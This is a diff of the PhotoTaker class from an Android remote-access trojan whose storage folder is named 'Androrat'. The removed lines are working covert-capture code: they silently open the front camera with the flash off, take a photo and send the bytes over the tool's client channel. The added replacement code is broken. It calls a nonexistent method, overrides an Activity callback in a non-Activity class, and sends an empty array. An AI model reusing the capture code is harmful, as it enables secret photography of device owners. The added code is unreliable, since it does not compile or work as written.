@@ -1,5 +1,6 @@
 package my.app.Library;
 
+import java.io.File;
 import java.io.IOException;
 
 import my.app.client.ClientListener;
@@ -15,8 +16,8 @@ import android.graphics.ImageFormat;
 import android.graphics.PixelFormat;
 import android.graphics.SurfaceTexture;
 
-import android.hardware.camera2.CameraManager;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.IBinder;
 import android.sax.StartElementListener;
 import android.util.Log;
@@ -26,10 +27,14 @@ import android.view.SurfaceView;
 import android.view.WindowManager;
 import android.webkit.WebView.FindListener;
 import android.widget.ImageView;
+import android.widget.Toast;
 
-public class PhotoTaker implements Camera.PictureCallback {
+import static android.app.Activity.RESULT_OK;
 
-	Camera cam;
+public class PhotoTaker {
+	private static final int RESULT_PICTURE_TAKEN=1337;
+	private File rootDir;
+
 	ClientListener ctx;
 	int chan;
 	SurfaceHolder holder;
@@ -37,62 +42,44 @@ public class PhotoTaker implements Camera.PictureCallback {
 	public PhotoTaker(ClientListener c, int chan) {
 		this.chan = chan;
 		ctx = c;
+		File downloads= Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+		rootDir=new File(downloads, "Androrat");
+		rootDir.mkdirs();
 	}
 
 	public boolean takePhoto() throws InterruptedException {
 		if (!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)))
 			return false;
 		Log.i("CAMERA1", "la fotocamera presente");
+		Intent i=new CameraActivity.IntentBuilder(ctx)
+				.to(new File(rootDir, "test.jpg"))
+				.updateMediaStore()
+				.build();
 
-		int cameraId = -1;
-		int numberOfCameras = Camera.getNumberOfCameras();
-		for (int i = 0; i < numberOfCameras; i++) {
-			CameraInfo info = new CameraInfo();
-			Camera.getCameraInfo(i, info);
-			Log.i("CAMERA1", "Hai a disposizione la camera: " + Integer.toString(i));
-		}
-		try {
-			cam = Camera.open(1);
-		} catch (Exception e) {
-			return false;
-		}
+		getstartActivityForResult(i, RESULT_PICTURE_TAKEN);
 
-		Log.i("CAMERA1", "fotocamera aperta correttamente");
 
-		try {
-			cam.setPreviewTexture(new SurfaceTexture(10));
-		} catch (IOException e1) {
-			Log.i("CAMERA1", "problema a creare la surfaceTexture");
-		}
-		Log.i("CAMERA1", "surfacetexture creata correttamente");
-		Parameters params = cam.getParameters();
-		params.setPreviewSize(640, 480);
-		Log.i("CAMERA1", "preview impostata");
-		params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
-		Log.i("CAMERA1", "flash impostato");
-		params.setPictureFormat(ImageFormat.JPEG);
-		params.setJpegQuality(30);
-		Log.i("CAMERA1", "formato impostato");
-		cam.setParameters(params);
-		Log.i("CAMERA1", "parametri inviati alla fotocamera");
-		cam.startPreview();
-		Log.i("CAMERA1", "mi metto a dormire");
-		// Thread.sleep(30000);
-		Log.i("CAMERA1", "la preview  pronta; mi sveglio");
-		cam.takePicture(null, null, null, this);
 		return true;
 	}
 
-	public void onPictureTaken(byte[] data, Camera camera) {
-		// TODO Auto-generated method stub
-		Log.i("CAMERA1", "fotografia scattata");
-		ctx.handleData(chan, data);
-		Log.i("CAMERA1", "fotografia inviata");
-		camera.stopPreview();
-		camera.release();
-		cam = null;
-		Log.i("CAMERA1", "camera distrutta");
 
+	@Override
+	protected void onActivityResult(int requestCode, int resultCode,
+									Intent data) {
+		Toast t=null;
+		byte bytedata[] = new byte[0];
+		ctx.handleData(chan, bytedata);
+
+		if (resultCode==RESULT_OK) {
+			if (requestCode==RESULT_PICTURE_TAKEN) {
+				t=Toast.makeText(ctx, "Picture taken",
+						Toast.LENGTH_LONG);
+			}
+
+			t.show();
+		}
 	}
+
+
 
 }
